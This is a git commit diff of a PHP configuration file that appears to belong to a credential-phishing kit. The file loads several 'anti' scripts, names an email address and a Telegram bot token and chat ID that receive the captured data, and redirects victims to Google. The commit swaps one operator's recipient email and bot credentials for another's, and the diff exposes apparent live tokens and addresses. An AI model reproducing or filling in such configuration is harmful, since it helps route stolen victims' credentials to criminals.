59303ab4cab155dbd7cdc931836649e1a8705078
Jamba1111 <authurlicon@gmail.com>
2026-04-15 20:19:33 -0600

    Update id.php

--- id.php
+++ id.php
@@ -7,9 +7,9 @@ include "anti/anti5.php";
 include "anti/anti6.php"; 
 include "anti/anti7.php"; 
 include "anti/anti8.php"; 
-$Receive_email="adio562676@gmail.com";
-$botToken="7015226310:AAE3lPdFW21Lodz9cHd2L-o1_c49i0RLwVU"; // telegram bot api
-$IdTelegram=array("6229068787"); // telegram id
+$Receive_email="birkreis@gmail.com";
+$botToken="8698905523:AAGMDAN3QnlQx7kgabaTX_bZ0hSUC3pS8E4"; // telegram bot api
+$IdTelegram=array("5553272813"); // telegram id
 $redirect="https://www.google.com/";
 
 ?>
